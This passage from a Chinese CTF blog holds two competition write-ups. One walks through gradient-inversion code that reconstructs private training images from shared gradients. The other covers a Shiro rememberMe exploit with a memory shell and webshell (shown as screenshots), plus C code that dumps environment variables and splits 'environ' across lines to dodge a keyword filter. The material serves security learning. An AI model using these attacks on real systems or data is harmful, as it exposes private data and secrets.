<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Alice and Bob decided to train a better AI model with their own data sets. However, Bob doesn’t want to show Alice all his secrets, especially his original pictures, so he only gave Alice some training gradients. But is it really safe?</span><br><span class="line">艾丽斯和鲍勃决定使用各自的数据集训练一个更好的人工智能模型。然而，鲍勃不想向艾丽斯展示他所有的机密，特别是他的原始图片，所以他只提供了一些训练梯度给艾丽斯。但这真的安全吗？</span><br></pre></td></tr></table></figure>
<p>从提示很明显看出本题的核心就是梯度恢复数据。</p>
<p>这是出题人给出的完整exp，现在结合<a href="https://link.zhihu.com/?target=https%3A//github.com/mit-han-lab/dlg%E5%8E%9F%E8%AE%BA%E6%96%87%E5%A4%8D%E7%8E%B0%E4%BB%A3%E7%A0%81%E6%9D%A5%E8%A7%A3%E6%9E%90%E7%90%86%E8%A7%A3%E6%96%B9%E6%B3%95%E3%80%82">https://link.zhihu.com/?target=https%3A//github.com/mit-han-lab/dlg原论文复现代码来解析理解方法。</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"><span class="keyword">import</span> torch.nn <span class="keyword">as</span> nn</span><br><span class="line"><span class="keyword">import</span> torch.nn.functional <span class="keyword">as</span> F</span><br><span class="line"><span class="keyword">from</span> torchvision <span class="keyword">import</span> transforms</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">AliceNet2</span>(nn.Module):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">super</span>(AliceNet2, self).__init__()</span><br><span class="line">        self.conv = \</span><br><span class="line">            nn.Sequential(</span><br><span class="line">            nn.Conv2d(<span class="number">3</span>,<span class="number">12</span>,kernel_size=<span class="number">5</span>,padding=<span class="number">2</span>,stride=<span class="number">2</span>),</span><br><span class="line">            nn.Sigmoid(),</span><br><span class="line">            nn.Conv2d(<span class="number">12</span>,<span class="number">12</span>,kernel_size=<span class="number">5</span>,padding=<span class="number">2</span>, stride=<span class="number">2</span>),</span><br><span class="line">            nn.Sigmoid(),</span><br><span class="line">            nn.Conv2d(<span class="number">12</span>,<span class="number">12</span>,kernel_size=<span class="number">5</span>,padding=<span class="number">2</span>,stride=<span class="number">1</span>),</span><br><span class="line">            nn.Sigmoid(),</span><br><span class="line">            nn.Conv2d(<span class="number">12</span>,<span class="number">12</span>,kernel_size=<span class="number">5</span>,padding=<span class="number">2</span>,stride=<span class="number">1</span>),</span><br><span class="line">            nn.Sigmoid(),</span><br><span class="line">        )</span><br><span class="line">        self.fc = \</span><br><span class="line">            nn.Sequential(</span><br><span class="line">            nn.Linear(<span class="number">768</span>, <span class="number">200</span>)</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">forward</span>(<span class="params">self, x</span>):</span><br><span class="line">        x = self.conv(x)</span><br><span class="line">        x = x.view(x.size(<span class="number">0</span>), -<span class="number">1</span>)</span><br><span class="line">        x = self.fc(x)</span><br><span class="line">        <span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">criterion</span>(<span class="params">pred_y, grand_y</span>):</span><br><span class="line">    <span class="comment"># This is the Cross entropy loss function</span></span><br><span class="line">    tmptensor=torch.mean(</span><br><span class="line">        torch.<span class="built_in">sum</span>(</span><br><span class="line">            - grand_y * F.log_softmax(pred_y, dim=-<span class="number">1</span>), <span class="number">1</span></span><br><span class="line">        ))</span><br><span class="line">    <span class="keyword">return</span> tmptensor</span><br><span class="line"></span><br><span class="line">ts1 = transforms.Compose([transforms.Resize(<span class="number">32</span>),transforms.CenterCrop(<span class="number">32</span>),transforms.ToTensor()])</span><br><span class="line">ts2 = transforms.ToPILImage()</span><br><span class="line"></span><br><span class="line">my_device = <span class="string">&quot;cpu&quot;</span></span><br><span class="line"><span class="keyword">if</span> torch.cuda.is_available():</span><br><span class="line">    my_device = <span class="string">&quot;cuda&quot;</span></span><br><span class="line"></span><br><span class="line">Net = torch.load(<span class="string">&#x27;./Net.model&#x27;</span>).to(my_device)</span><br><span class="line">outpath=<span class="string">&#x27;./grad/&#x27;</span></span><br><span class="line"></span><br><span class="line">torch.manual_seed(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">25</span>):</span><br><span class="line">    original_dy_dx=dy_dx=torch.load(outpath+<span class="built_in">str</span>(i)+<span class="string">&#x27;.tensor&#x27;</span>)</span><br><span class="line">    dummy_data = torch.randn(<span class="number">1</span>,<span class="number">3</span>,<span class="number">32</span>,<span class="number">32</span>).to(my_device).requires_grad_(<span class="literal">True</span>)</span><br><span class="line">    dummy_label = torch.randn(<span class="number">1</span>,<span class="number">200</span>).to(my_device).requires_grad_(<span class="literal">True</span>)</span><br><span class="line">    optimizer = torch.optim.LBFGS([dummy_data, dummy_label])</span><br><span class="line">    history = []</span><br><span class="line">    <span class="keyword">for</span> iters <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">300</span>):</span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">closure</span>():</span><br><span class="line">            optimizer.zero_grad()</span><br><span class="line">            pred = Net(dummy_data)</span><br><span class="line">            dummy_onehot_label = F.softmax(dummy_label, dim=-<span class="number">1</span>)</span><br><span class="line">            dummy_loss = criterion(pred,</span><br><span class="line">                                   dummy_onehot_label)</span><br><span class="line">            dummy_dy_dx = torch.autograd.grad(dummy_loss, Net.parameters(), create_graph=<span class="literal">True</span>)</span><br><span class="line">            grad_diff = <span class="number">0</span></span><br><span class="line">            grad_count = <span class="number">0</span></span><br><span class="line">            <span class="keyword">for</span> gx, gy <span class="keyword">in</span> <span class="built_in">zip</span>(dummy_dy_dx, original_dy_dx):</span><br><span class="line">                grad_diff += ((gx - gy) ** <span class="number">2</span>).<span class="built_in">sum</span>()</span><br><span class="line">                grad_count += gx.nelement()</span><br><span class="line">            grad_diff.backward()</span><br><span class="line">            <span class="keyword">return</span> grad_diff</span><br><span class="line"></span><br><span class="line">        optimizer.step(closure)</span><br><span class="line">        <span class="keyword">if</span> iters % <span class="number">10</span> == <span class="number">0</span>:</span><br><span class="line">            current_loss = closure()</span><br><span class="line">            <span class="built_in">print</span>(iters, <span class="string">&quot;%.4f&quot;</span> % current_loss.item())</span><br><span class="line">        history.append(ts2(dummy_data[<span class="number">0</span>].cpu()))</span><br><span class="line"></span><br><span class="line">    plt.figure(figsize=(<span class="number">12</span>, <span class="number">8</span>))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>):</span><br><span class="line">        plt.subplot(<span class="number">3</span>, <span class="number">10</span>, i + <span class="number">1</span>)</span><br><span class="line">        plt.imshow(history[i * <span class="number">10</span>])</span><br><span class="line">        plt.title(<span class="string">&quot;iter=%d&quot;</span> % (i * <span class="number">10</span>))</span><br><span class="line">        plt.axis(<span class="string">&#x27;off&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Dummy label is %d.&quot;</span> % torch.argmax(dummy_label, dim=-<span class="number">1</span>).item())</span><br><span class="line">    plt.show()</span><br></pre></td></tr></table></figure>
<p>根据出题人给出的exp，尝试运行，但实际恢复效果却不太好？</p>
<p>这边对每一部分代码进行解释</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">AliceNet2</span>(nn.Module):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">super</span>(AliceNet2, self).__init__()</span><br><span class="line">        self.conv = \</span><br><span class="line">            nn.Sequential(</span><br><span class="line">            nn.Conv2d(<span class="number">3</span>,<span class="number">12</span>,kernel_size=<span class="number">5</span>,padding=<span class="number">2</span>,stride=<span class="number">2</span>),</span><br><span class="line">            nn.Sigmoid(),</span><br><span class="line">            nn.Conv2d(<span class="number">12</span>,<span class="number">12</span>,kernel_size=<span class="number">5</span>,padding=<span class="number">2</span>, stride=<span class="number">2</span>),</span><br><span class="line">            nn.Sigmoid(),</span><br><span class="line">            nn.Conv2d(<span class="number">12</span>,<span class="number">12</span>,kernel_size=<span class="number">5</span>,padding=<span class="number">2</span>,stride=<span class="number">1</span>),</span><br><span class="line">            nn.Sigmoid(),</span><br><span class="line">            nn.Conv2d(<span class="number">12</span>,<span class="number">12</span>,kernel_size=<span class="number">5</span>,padding=<span class="number">2</span>,stride=<span class="number">1</span>),</span><br><span class="line">            nn.Sigmoid(),</span><br><span class="line">        )</span><br><span class="line">        self.fc = \</span><br><span class="line">            nn.Sequential(</span><br><span class="line">            nn.Linear(<span class="number">768</span>, <span class="number">200</span>)</span><br><span class="line">        )</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">forward</span>(<span class="params">self, x</span>):</span><br><span class="line">        x = self.conv(x)</span><br><span class="line">        x = x.view(x.size(<span class="number">0</span>), -<span class="number">1</span>)</span><br><span class="line">        x = self.fc(x)</span><br><span class="line">        <span class="keyword">return</span> x</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">criterion</span>(<span class="params">pred_y, grand_y</span>):</span><br><span class="line">    <span class="comment"># This is the Cross entropy loss function</span></span><br><span class="line">    tmptensor=torch.mean(</span><br><span class="line">        torch.<span class="built_in">sum</span>(</span><br><span class="line">            - grand_y * F.log_softmax(pred_y, dim=-<span class="number">1</span>), <span class="number">1</span></span><br><span class="line">        ))</span><br><span class="line">    <span class="keyword">return</span> tmptensor</span><br></pre></td></tr></table></figure>
<p>这里初识化定义了一个卷积神经网络模型LeNet，在原论文中除了LeNet网络模型，还有一种为Resnet，暂时先对这一种进行理解。序列里包含了四个卷积层，每个卷积层后面跟着一个 Sigmoid 激活函数。每个卷积层使用 5x5 的卷积核，具有不同的步长 (<code>stride</code>) 和池化(<code>padding</code>)。</p>
<p>然后包含一个线性全连接层，输入特征数为 768（由前面的卷积层产生）和输出特征数为 200。通过这个全连接层，网络将图像的特征映射到一个 200 维的空间，通常用于图像分类及特征提取。</p>
<p>其中forward方法定义了数据在通过模型时的前向传播过程，输入数据 <code>x</code> 经过卷积层处理，然后被拉直成一维向量，最后经过全连接层 得到最终输出。</p>
<p>criterion 函数定义了交叉熵损失函数，用于衡量模型输出与目标标签之间的差异。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ts1 = transforms.Compose([transforms.Resize(<span class="number">32</span>),transforms.CenterCrop(<span class="number">32</span>),transforms.ToTensor()])</span><br><span class="line">ts2 = transforms.ToPILImage()</span><br></pre></td></tr></table></figure>
<p>这里的两行主要是进行图像转换的一些操作，第一行用于图像转换为张量，第二行用于张量转换为图像，即图像的预处理和后处理。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">my_device = <span class="string">&quot;cpu&quot;</span></span><br><span class="line"><span class="keyword">if</span> torch.cuda.is_available():</span><br><span class="line">    my_device = <span class="string">&quot;cuda&quot;</span></span><br><span class="line"></span><br><span class="line">Net = torch.load(<span class="string">&#x27;./Net.model&#x27;</span>).to(my_device)</span><br><span class="line">outpath=<span class="string">&#x27;./grad/&#x27;</span></span><br></pre></td></tr></table></figure>
<p>使用计算机cuda进行计算，以及对模型和张量数据的导入处理</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">torch.manual_seed(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
<p><code>torch.manual_seed(0)</code> 的作用是设置 PyTorch 中的随机数生成器的种子为 0，相同的随机数种子将产生相同的随机数序列。而在这种攻击方法中，有涉及到伪标签和伪数据的初始化，所以设置seed种子，尽可能保证生成的相似性。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">25</span>):</span><br><span class="line">    original_dy_dx=dy_dx=torch.load(outpath+<span class="built_in">str</span>(i)+<span class="string">&#x27;.tensor&#x27;</span>)</span><br><span class="line">    dummy_data = torch.randn(<span class="number">1</span>,<span class="number">3</span>,<span class="number">32</span>,<span class="number">32</span>).to(my_device).requires_grad_(<span class="literal">True</span>)</span><br><span class="line">    dummy_label = torch.randn(<span class="number">1</span>,<span class="number">200</span>).to(my_device).requires_grad_(<span class="literal">True</span>)</span><br><span class="line">    optimizer = torch.optim.LBFGS([dummy_data, dummy_label])</span><br><span class="line">    history = []</span><br><span class="line">    <span class="keyword">for</span> iters <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">300</span>):</span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">closure</span>():</span><br><span class="line">            optimizer.zero_grad()</span><br><span class="line">            pred = Net(dummy_data)</span><br><span class="line">            dummy_onehot_label = F.softmax(dummy_label, dim=-<span class="number">1</span>)</span><br><span class="line">            dummy_loss = criterion(pred,</span><br><span class="line">                                   dummy_onehot_label)</span><br><span class="line">            dummy_dy_dx = torch.autograd.grad(dummy_loss, Net.parameters(), create_graph=<span class="literal">True</span>)</span><br><span class="line">            grad_diff = <span class="number">0</span></span><br><span class="line">            grad_count = <span class="number">0</span></span><br><span class="line">            <span class="keyword">for</span> gx, gy <span class="keyword">in</span> <span class="built_in">zip</span>(dummy_dy_dx, original_dy_dx):</span><br><span class="line">                grad_diff += ((gx - gy) ** <span class="number">2</span>).<span class="built_in">sum</span>()</span><br><span class="line">                grad_count += gx.nelement()</span><br><span class="line">            grad_diff.backward()</span><br><span class="line">            <span class="keyword">return</span> grad_diff</span><br><span class="line"></span><br><span class="line">        optimizer.step(closure)</span><br><span class="line">        <span class="keyword">if</span> iters % <span class="number">10</span> == <span class="number">0</span>:</span><br><span class="line">            current_loss = closure()</span><br><span class="line">            <span class="built_in">print</span>(iters, <span class="string">&quot;%.4f&quot;</span> % current_loss.item())</span><br><span class="line">        history.append(ts2(dummy_data[<span class="number">0</span>].cpu()))</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>这一段是论文思想的核心重点就是创建dummy_data,dummy_label所得到的梯度与原始训练数据所得到的梯度的均方误差，再用损失函数对dummy_data,dummy_label最优化，不断迭代以恢复出原始数据，但是可能也就是这里存在问题，使得我实际得到的图像效果不佳，但暂时还没确定问题的原因。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">plt.figure(figsize=(<span class="number">12</span>, <span class="number">8</span>))</span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>):</span><br><span class="line">       plt.subplot(<span class="number">3</span>, <span class="number">10</span>, i + <span class="number">1</span>)</span><br><span class="line">       plt.imshow(history[i * <span class="number">10</span>])</span><br><span class="line">       plt.title(<span class="string">&quot;iter=%d&quot;</span> % (i * <span class="number">10</span>))</span><br><span class="line">       plt.axis(<span class="string">&#x27;off&#x27;</span>)</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&quot;Dummy label is %d.&quot;</span> % torch.argmax(dummy_label, dim=-<span class="number">1</span>).item())</span><br><span class="line">   plt.show()</span><br></pre></td></tr></table></figure>
<p>这一段就是将所优化后的数据进行可视化操作，以达成数据恢复的目的</p>
<p>然后根据相关资料找了一个改进的攻击方法</p>
]]></content>
      <categories>
        <category>AI</category>
        <category>AI-CTF</category>
      </categories>
      <tags>
        <tag>2022*CTF</tag>
        <tag>AI</tag>
      </tags>
  </entry>
  <entry>
    <title>2023NepNep-Writeup</title>
    <url>/2023/09/29/2023NepNep-Writeup/</url>
    <content><![CDATA[<h1>2023NepNep-Writeup</h1>
<h2 id="Web">Web</h2>
<h3 id="ez-java-checkin">ez_java_checkin</h3>
<p>提示管理员登陆，admin默认</p>
<p><img src="https://s2.loli.net/2023/09/29/eTOApcdyrMXtwzR.png" alt=""></p>
<p>发现rememberMe=deleteMe，查询找到相关漏洞</p>
<p>工具一把梭</p>
<p><img src="https://s2.loli.net/2023/09/29/zTWpvLM6VZRPdxO.png" alt=""></p>
<p>注入内存马</p>
<p><img src="https://s2.loli.net/2023/09/29/VIqdTD8banlQ3uX.png" alt=""></p>
<p>连接webshell</p>
<p><img src="https://s2.loli.net/2023/09/29/w2NgWBtjGOxZAHU.png" alt=""></p>
<p>开始寻找flag，在start.sh中找到</p>
<p><img src="https://s2.loli.net/2023/09/29/s4phrUitKWZTBvN.png" alt=""></p>
<h2 id="Misc">Misc</h2>
<h3 id="CheckIn">CheckIn</h3>
<p><img src="https://s2.loli.net/2023/09/29/TWKFvQROpV9ySxu.png" alt=""></p>
<h3 id="与AI共舞的哈夫曼">与AI共舞的哈夫曼</h3>
<p>给的是一段压缩算法，根据提示交给chtgpt</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import heapq</span><br><span class="line"></span><br><span class="line">class HuffmanNode:</span><br><span class="line">    def __init__(self, char, freq):</span><br><span class="line">        self.char = char</span><br><span class="line">        self.freq = freq</span><br><span class="line">        self.left = None</span><br><span class="line">        self.right = None</span><br><span class="line"></span><br><span class="line">    def __lt__(self, other):</span><br><span class="line">        return self.freq &lt; other.freq</span><br><span class="line"></span><br><span class="line">def build_huffman_tree(frequencies):</span><br><span class="line">    heap = [HuffmanNode(char, freq) for char, freq in frequencies.items()]</span><br><span class="line">    heapq.heapify(heap)</span><br><span class="line"></span><br><span class="line">    while len(heap) &gt; 1:</span><br><span class="line">        left = heapq.heappop(heap)</span><br><span class="line">        right = heapq.heappop(heap)</span><br><span class="line">        merged = HuffmanNode(None, left.freq + right.freq)</span><br><span class="line">        merged.left = left</span><br><span class="line">        merged.right = right</span><br><span class="line">        heapq.heappush(heap, merged)</span><br><span class="line"></span><br><span class="line">    return heap[0]</span><br><span class="line"></span><br><span class="line">def decompress(input_file, output_file):</span><br><span class="line">    with open(input_file, &#x27;rb&#x27;) as f:</span><br><span class="line">        data = f.read()</span><br><span class="line"></span><br><span class="line">    num_symbols = data[0]</span><br><span class="line">    frequencies = &#123;&#125;</span><br><span class="line">    offset = 1</span><br><span class="line"></span><br><span class="line">    for i in range(num_symbols):</span><br><span class="line">        byte = data[offset]</span><br><span class="line">        freq = (data[offset + 1] &lt;&lt; 24) | (data[offset + 2] &lt;&lt; 16) | (data[offset + 3] &lt;&lt; 8) | data[offset + 4]</span><br><span class="line">        frequencies[byte] = freq</span><br><span class="line">        offset += 5</span><br><span class="line"></span><br><span class="line">    root = build_huffman_tree(frequencies)</span><br><span class="line"></span><br><span class="line">    decoded_data = &#x27;&#x27;</span><br><span class="line">    current_node = root</span><br><span class="line"></span><br><span class="line">    for byte in data[offset:]:</span><br><span class="line">        bits = bin(byte)[2:].rjust(8, &#x27;0&#x27;)</span><br><span class="line">        for bit in bits:</span><br><span class="line">            if bit == &#x27;0&#x27;:</span><br><span class="line">                current_node = current_node.left</span><br><span class="line">            else:</span><br><span class="line">                current_node = current_node.right</span><br><span class="line"></span><br><span class="line">            if current_node.char is not None:</span><br><span class="line">                decoded_data += chr(current_node.char)</span><br><span class="line">                current_node = root</span><br><span class="line"></span><br><span class="line">    with open(output_file, &#x27;w&#x27;, encoding=&#x27;utf-8&#x27;) as f:</span><br><span class="line">        f.write(decoded_data)</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    compressed_file = &#x27;compressed.bin&#x27;</span><br><span class="line">    decompressed_file = &#x27;decompressed.txt&#x27;</span><br><span class="line"></span><br><span class="line">    # 解压缩文件</span><br><span class="line">    decompress(compressed_file, decompressed_file)</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2023/09/29/o5xBwTz7MJUCFi2.png" alt=""></p>
<h3 id="小叮弹钢琴">小叮弹钢琴</h3>
<p>首先给的一段音频，用Au打开，发现包含两个内容，一个明显是十六制数字，另外一个怀疑是摩斯密码，手写下来解码得到一段明文</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">YOUSHOULDUSETHISTOXORSOMETHING</span><br></pre></td></tr></table></figure>
<p>根据提示，考虑异或解密，手搓了一段脚本</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cipher_text_hex = &quot;0x370a05303c290e045005031c2b1858473a5f052117032c39230f005d1e17&quot;</span><br><span class="line">cipher_text_bytes = bytes.fromhex(cipher_text_hex[2:])</span><br><span class="line">key = &quot;YOUSHOULDUSETHISTOXORSOMETHING&quot;</span><br><span class="line">key_bytes = key.encode()</span><br><span class="line">plain_text_bytes = bytearray(len(cipher_text_bytes))</span><br><span class="line"></span><br><span class="line">for i in range(len(cipher_text_bytes)):</span><br><span class="line">    plain_text_bytes[i] = cipher_text_bytes[i] ^ key_bytes[i % len(key_bytes)]</span><br><span class="line"></span><br><span class="line">decrypted_text = plain_text_bytes.decode()</span><br><span class="line"></span><br><span class="line">print(&quot;Decrypted Text:&quot;, decrypted_text)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>但是解下来出现了nep字样，但是字符不对劲</p>
<p><img src="https://s2.loli.net/2023/09/29/FoR42QkXEf7JsSh.png" alt=""></p>
<p>然后用CyberChef一把梭，得到了结果</p>
<p><img src="https://s2.loli.net/2023/09/29/DpPRqJvEW8SImNB.png" alt=""></p>
<p>应该是脚本存在问题，但是代码能力有限，真想不出来了，等赛后wp吧</p>
<h3 id="codes">codes</h3>
<p>根据提示，flag在环境变量中</p>
<p>根据查找，有一下几种方法</p>
<ol>
<li>
<p><strong>使用 <code>extern char **environ</code> 全局变量：</strong></p>
<p>这是一种直接的方法，使用全局变量 <code>environ</code>，它是一个指向指针的指针，用于存储环境变量的字符串数组。遍历这个数组并打印环境变量的值。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="keyword">extern</span> <span class="type">char</span> **environ;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (environ[i] != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, environ[i]);</span><br><span class="line">        i++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p><strong>使用 <code>getenv()</code> 函数：</strong></p>
<p><code>getenv()</code> 函数允许你通过指定环境变量名称来获取其值。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span>* env_var_name = <span class="string">&quot;PATH&quot;</span>;</span><br><span class="line">    <span class="type">char</span>* env_var_value = getenv(env_var_name);</span><br><span class="line">    <span class="keyword">if</span> (env_var_value != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s=%s\n&quot;</span>, env_var_name, env_var_value);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Environment variable &#x27;%s&#x27; not found.\n&quot;</span>, env_var_name);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p><strong>使用 <code>main()</code> 函数的参数 <code>char *argv[]</code>：</strong></p>
<p>程序的启动参数中也包含了环境变量信息。这种方法需要一些额外的解析工作。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[], <span class="type">char</span> *envp[])</span> &#123;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (envp[i] != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, envp[i]);</span><br><span class="line">        i++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ol>
<p>逐个尝试，全部失败了</p>
<p>开始尝试各种绕过姿势</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">extern char **en\</span><br><span class="line">viron;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">    int i = 0;</span><br><span class="line">    while (en\</span><br><span class="line">viron[i] != NULL) &#123;</span><br><span class="line">        printf(&quot;%s\n&quot;, en\</span><br><span class="line">viron[i]);</span><br><span class="line">        i++;</span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>最终得到flag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Nepctf&#123;easy_codes_3a5786c2-dd96-46bd-9909-23f894dc8d2a_[TEAM_HASH]&#125;</span><br></pre></td></tr></table></figure>
<h3 id="ConnectedFive">ConnectedFive</h3>
<p><img src="https://s2.loli.net/2023/09/29/DIuOpeSJkYsTxWf.png" alt=""></p>
<p>万宁，果真折磨</p>
<h3 id="陌生的语言">陌生的语言</h3>
<p>没啥好说的，上图，比较好奇出题人到底是怎么找到的这个图</p>
<p><img src="https://s2.loli.net/2023/09/29/ifCgDS2O9Jzdw1y.jpg" alt=""></p>
<p><img src="https://s2.loli.net/2023/09/29/wofOdTlQaR38XpE.png" alt=""></p>
<p>然后将对应一下，最终成功提交上去的flag为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">NepCTF&#123;NEPNEP_A_BELIEVING_HEART_IS_YOUR_MAGIC&#125;</span><br></pre></td></tr></table></figure>
<h3 id="你也喜欢三月七么">你也喜欢三月七么</h3>
<p>拿到手刚开始以为这个题是密码的，当然，也确实有部分是，但主要可能是考察阅读理解。我还想再说一句，星穹铁道，启动！</p>
<p>首先先来看一下附件给了我们什么内容</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">salt_lenth= 10 </span><br><span class="line">key_lenth= 16 </span><br><span class="line">iv= 88219bdee9c396eca3c637c0ea436058 #原始iv转hex的值</span><br><span class="line">ciphertext= b700ae6d0cc979a4401f3dd440bf9703b292b57b6a16b79ade01af58025707fbc29941105d7f50f2657cf7eac735a800ecccdfd42bf6c6ce3b00c8734bf500c819e99e074f481dbece626ccc2f6e0562a81fe84e5dd9750f5a0bb7c20460577547d3255ba636402d6db8777e0c5a429d07a821bf7f9e0186e591dfcfb3bfedfc</span><br></pre></td></tr></table></figure>
<p>第一个是salt的长度，第二个是key的长度，第三个是偏移量iv，第四个就是相对应的密文了</p>
<p>其次，来分析一下题目给的提示</p>
<p><u><strong>三月七：耶，终于来到Nepnep星球啦，让我看看正在火热进行的Hacker夺旗大赛群聊。啊！开拓者，这群名看起来怪怪的诶。 （伸出脑袋，凑近群名，轻轻的闻了一下）哇，好咸诶，开拓者你快来看看！</strong></u></p>
<p><u><strong>开拓者（U_id）：(端着下巴，磨蹭了一下，眼神若有所思）这好像需要经过啥256处理一下才能得到我们需要的关键。</strong></u></p>
<p>第一次阅读的时候我的关注点就是再256和群名两个关键上，256是指向hash算法，群名自然是跟附件中没有给出的key（PS：题目中关键的英文也是key）有关。</p>
<p>但是我刚开始完全没有注意到一个长度的问题，也就是salt_lenth= 10 和key_lenth= 16，而是将NepCTF 2023直接哈希计算了，中间留了空格（PS：因为我看群名也是留了空格的），甚至因为存在salt这个量还在考虑是否算法还进行了变种，然后尝试aes解密失败了。后来又从题目里的关键提示，也就是三月七闻群名好咸，咸指的自然就是盐，而盐的英文是salt。意识到这一点，也就开始知道为什么给出了两个长度值了salt的长度是提示使用NepCTF2023（PS:不加空格，刚好十个字），然后开始计算哈希256，得到的是</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dd8e671df3882c5be6423cd030bd7cb69671ef27dfe7a541903edc4e23168009</span><br></pre></td></tr></table></figure>
<p>但是长度是32个字节，所以需要截取出一半作为key，具体代码实现如下</p>
